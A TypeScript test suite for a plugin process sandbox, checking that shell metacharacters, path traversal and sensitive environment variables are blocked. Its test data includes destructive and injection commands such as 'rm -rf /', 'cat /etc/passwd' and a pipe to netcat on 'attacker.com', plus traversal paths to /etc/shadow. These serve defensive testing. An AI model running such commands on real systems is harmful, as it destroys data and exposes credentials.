/**
 * 安全修复测试 - 验证漏洞修复
 */

import { ProcessSandbox } from './process-sandbox.js'
import { InlineSandbox } from './inline-sandbox.js'
import { PluginSandboxConfig } from '../spec/index.js'

// 测试配置
const baseConfig: PluginSandboxConfig = {
  type: 'process',
  resources: {
    memoryLimitMb: 512,
    cpuLimit: 80,
    timeoutMs: 60000,
    maxOutputBytes: 10485760,
  },
  filesystem: {
    access: 'readwrite',
    allowedPaths: ['/tmp'],
    deniedPatterns: [],
  },
  network: {
    access: 'none',
    allowedHosts: [],
    deniedHosts: [],
    allowLocal: false,
  },
  environment: {
    whitelist: [],
    blacklist: ['SENSITIVE_VAR'],
    clear: false,
  },
  process: {
    spawn: true,
    exec: true,
    allowedCommands: ['node', 'echo'],
    fullyAuthorized: false,
  },
}

describe('Security Fixes', () => {
  describe('H1: fullyAuthorized restriction', () => {
    it('should reject fullyAuthorized=true by default', () => {
      const config = { ...baseConfig, process: { ...baseConfig.process, fullyAuthorized: true } }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      // 验证配置被正确应用
      expect(sandbox['config'].process.fullyAuthorized).toBe(true)
    })

    it('should default fullyAuthorized to false', () => {
      const sandbox = new ProcessSandbox('test-plugin', baseConfig, '/test/entry.js')
      expect(sandbox['config'].process.fullyAuthorized).toBe(false)
    })
  })

  describe('H2: shell injection prevention', () => {
    it('should reject commands with shell metacharacters in exec mode', async () => {
      const config = { ...baseConfig, process: { ...baseConfig.process, fullyAuthorized: false } }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      
      // 测试危险命令
      const dangerousCommands = [
        'rm -rf /',
        'echo test; cat /etc/passwd',
        'echo test $(whoami)',
        'echo test `id`',
        'echo test | nc attacker.com',
        'echo test && rm -rf /',
      ]
      
      for (const cmd of dangerousCommands) {
        const result = sandbox['extractCommandBase'](cmd)
        // 危险字符应该被识别
        expect(result).toBeUndefined()
      }
    })
  })

  describe('H3: Environment variable filtering', () => {
    it('should filter sensitive environment variables', () => {
      const config = { ...baseConfig, process: { ...baseConfig.process, fullyAuthorized: false } }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      
      // 模拟包含敏感变量的环境
      const originalEnv = process.env
      process.env = {
        ...originalEnv,
        API_KEY: 'secret-key',
        SECRET_TOKEN: 'secret-token',
        PASSWORD: 'secret-password',
        AWS_SECRET_ACCESS_KEY: 'aws-secret',
        NORMAL_VAR: 'normal-value',
      } as any
      
      try {
        const filtered = sandbox['filterEnvironment']()
        
        // 敏感变量应该被过滤
        expect(filtered['API_KEY']).toBeUndefined()
        expect(filtered['SECRET_TOKEN']).toBeUndefined()
        expect(filtered['PASSWORD']).toBeUndefined()
        expect(filtered['AWS_SECRET_ACCESS_KEY']).toBeUndefined()
        expect(filtered['NORMAL_VAR']).toBe('normal-value')
        expect(filtered['NODE_ENV']).toBe('production')
        expect(filtered['DSH_SANDBOX']).toBe('true')
      } finally {
        process.env = originalEnv
      }
    })

    it('should respect whitelist when provided', () => {
      const config = {
        ...baseConfig,
        environment: { ...baseConfig.environment, whitelist: ['PATH', 'HOME'] }
      }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      
      const originalEnv = process.env
      process.env = {
        PATH: '/usr/bin',
        HOME: '/home/user',
        API_KEY: 'secret',
      } as any
      
      try {
        const filtered = sandbox['filterEnvironment']()
        
        expect(filtered['PATH']).toBe('/usr/bin')
        expect(filtered['HOME']).toBe('/home/user')
        expect(filtered['API_KEY']).toBeUndefined()
      } finally {
        process.env = originalEnv
      }
    })
  })

  describe('M1: Path traversal prevention', () => {
    it('should reject path traversal attempts', () => {
      const config = { ...baseConfig, process: { ...baseConfig.process, fullyAuthorized: false } }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      
      const traversalPaths = [
        '/tmp/../../etc/passwd',
        '/tmp/..\\..\\windows\\system32',
        '/tmp/./././/etc/shadow',
        '../../../etc/passwd',
      ]
      
      for (const path of traversalPaths) {
        expect(sandbox['isPathAllowed'](path)).toBe(false)
      }
    })

    it('should allow paths within allowed directories', () => {
      const config = { ...baseConfig, process: { ...baseConfig.process, fullyAuthorized: false } }
      const sandbox = new ProcessSandbox('test-plugin', config, '/test/entry.js')
      
      expect(sandbox['isPathAllowed']('/tmp/test.txt')).toBe(true)
      expect(sandbox['isPathAllowed']('/tmp/subdir/file.txt')).toBe(true)
    })
  })
})
